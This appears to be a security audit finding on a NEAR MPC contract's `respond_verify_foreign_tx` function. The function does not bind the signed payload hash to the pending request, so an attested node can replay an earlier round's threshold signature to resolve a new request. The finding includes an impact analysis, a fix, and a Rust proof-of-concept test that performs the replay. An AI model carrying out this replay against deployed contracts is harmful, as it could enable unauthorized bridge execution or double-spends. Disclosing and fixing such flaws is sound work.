### Title
`respond_verify_foreign_tx` Accepts Replayed Threshold Signatures From Prior Rounds, Delivering Semantically-Incorrect Attestations to New Requests — (`crates/contract/src/lib.rs`)

---

### Summary

`respond_verify_foreign_tx` verifies only that `sig(response.payload_hash)` is a valid ECDSA signature under the domain root key. It never checks that `response.payload_hash` was derived from a `ForeignTxSignPayload` whose embedded `request` field matches the `request` argument being resolved. A single malicious attested participant can capture a legitimately-produced threshold signature `sig(H_old)` from a completed round for request R1, then call `respond_verify_foreign_tx(R2, {payload_hash: H_old, sig: sig(H_old)})` against any pending request R2 with a different `tx_id`. The contract accepts the call, drains R2's yield queue, and delivers `{payload_hash: H_old, sig: sig(H_old)}` to R2's caller — a cryptographically-valid MPC attestation that was never authorized for R2.

---

### Finding Description

In `respond_verify_foreign_tx` (`lib.rs:718–747`), the only cryptographic check performed is:

```rust
near_mpc_signature_verifier::verify_ecdsa_signature(
    signature_response,
    &payload_hash,   // ← taken directly from response.payload_hash, caller-supplied
    &secp_pk,
)
.is_ok()
``` [1](#0-0) 

`payload_hash` is taken verbatim from the caller-supplied `response.payload_hash` field. There is no assertion that this hash equals `ForeignTxSignPayload::V1(ForeignTxSignPayloadV1 { request: request.request.clone(), values: <observed> }).compute_msg_hash()`. [2](#0-1) 

The `ForeignTxSignPayload` binds both the `ForeignChainRpcRequest` and the observed `values` into the hash. The contract stores only the `request` in `pending_verify_foreign_tx_requests` and never stores the expected hash at enqueue time. [3](#0-2) 

After the signature check passes, `resolve_yields_for` drains the entire yield queue for `request` and resumes every queued promise with the raw `response` bytes — including the attacker-supplied `payload_hash`: [4](#0-3) [5](#0-4) 

---

### Impact Explanation

The caller of R2 receives a `VerifyForeignTransactionResponse` containing:
- `payload_hash = H_old` — the hash of `ForeignTxSignPayload{request: R1, values: V1}`
- `signature = sig(H_old)` — a genuine threshold ECDSA signature over H_old

The signature is cryptographically valid. Any downstream contract (e.g., Omnibridge) that verifies only `verify_ecdsa(sig, payload_hash, root_pk)` without also asserting `payload_hash == expected_hash_for_R2` will accept this as a valid attestation for R2's `tx_id`, enabling unauthorized bridge execution or double-spend. The MPC network never verified R2's transaction; the attestation was produced for R1. [6](#0-5) 

---

### Likelihood Explanation

- **Attacker capability**: A single attested participant. No threshold collusion required. The attacker only needs to call `respond_verify_foreign_tx` as an attested node.
- **Signature availability**: `sig(H_old)` is publicly observable on-chain after any completed `verify_foreign_tx` round — it is returned as the yield-resume payload and emitted in the callback `return_verify_foreign_tx_and_clean_state_on_success`.
- **Target availability**: Any user can submit `verify_foreign_transaction` for an arbitrary `tx_id`, creating a pending R2 that the attacker can resolve with the replayed response.
- **No forgery needed**: The attacker reuses a legitimately-produced threshold signature; no cryptographic break is required.

---

### Recommendation

Include the full `ForeignTxSignPayload` in the response (not just its hash), and enforce the binding on-chain:

```rust
// In respond_verify_foreign_tx, after verifying the signature:
let expected_hash = ForeignTxSignPayload::V1(ForeignTxSignPayloadV1 {
    request: request.request.clone(),
    values: response.payload.values.clone(),  // payload now included in response
})
.compute_msg_hash()?;

if expected_hash != response.payload_hash {
    return Err(RespondError::PayloadHashMismatch.into());
}
```

Alternatively, store the expected hash prefix (keyed on `request`) at enqueue time and compare it against `response.payload_hash` before accepting the response. Either approach closes the gap between the signature check and the request-binding check. [7](#0-6)

### Proof of Concept

```rust
// 1. Complete a legitimate round for R1 (tx_id=[1u8;32]), capturing sig(H1).
let r1_args = VerifyForeignTransactionRequestArgs {
    domain_id: ...,
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: [1u8; 32].into(), confirmations: 2.into(),
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};
contract.verify_foreign_transaction(r1_args);
let r1_request = args_into_verify_foreign_tx_request(r1_args);

// Simulate honest MPC response for R1
let payload_r1 = ForeignTxSignPayload::V1(ForeignTxSignPayloadV1 {
    request: r1_request.request.clone(),
    values: vec![ExtractedValue::BitcoinExtractedValue(
        BitcoinExtractedValue::BlockHash([0xAA; 32].into()),
    )],
});
let h1 = payload_r1.compute_msg_hash().unwrap();
let sig_h1 = sign_with_root_key(&h1.0, &secret_key);
let response_r1 = VerifyForeignTransactionResponse { payload_hash: h1, signature: sig_h1.clone() };
contract.respond_verify_foreign_tx(r1_request, response_r1).unwrap();
// R1 is now resolved; sig(H1) is on-chain.

// 2. Submit R2 with a DIFFERENT tx_id.
let r2_args = VerifyForeignTransactionRequestArgs {
    domain_id: ...,
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: [2u8; 32].into(), confirmations: 2.into(),  // ← different tx_id
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};
contract.verify_foreign_transaction(r2_args);
let r2_request = args_into_verify_foreign_tx_request(r2_args);

// 3. Replay sig(H1) against R2 — payload_hash is H1, not H(R2, values).
let forged_response = VerifyForeignTransactionResponse {
    payload_hash: h1,       // ← H1 belongs to R1, not R2
    signature: sig_h1,      // ← valid sig over H1
};
// Contract accepts: sig(H1) verifies against root key → OK.
// No check that H1 == SHA256(borsh(ForeignTxSignPayload{request: R2, ...})).
let result = contract.respond_verify_foreign_tx(r2_request.clone(), forged_response);
assert!(result.is_ok(), "contract must reject this but currently accepts it");

// R2's yield is now resolved with H1 — an attestation for R1's tx_id.
assert!(contract.get_pending_verify_foreign_tx_request(&r2_request).is_none());

pub(crate) fn resolve_yields_for<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: &K,
    response_bytes: Vec<u8>,
) -> Result<(), Error>
where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let resumed = requests
        .remove(request)
        .unwrap_or_default()
        .into_iter()
        .map(|YieldIndex { data_id }| {
            env::promise_yield_resume(&data_id, response_bytes.clone());
        })
        .count();

    if resumed > 0 {
        Ok(())
    } else {
        Err(InvalidParameters::RequestNotFound.into())
    }
}
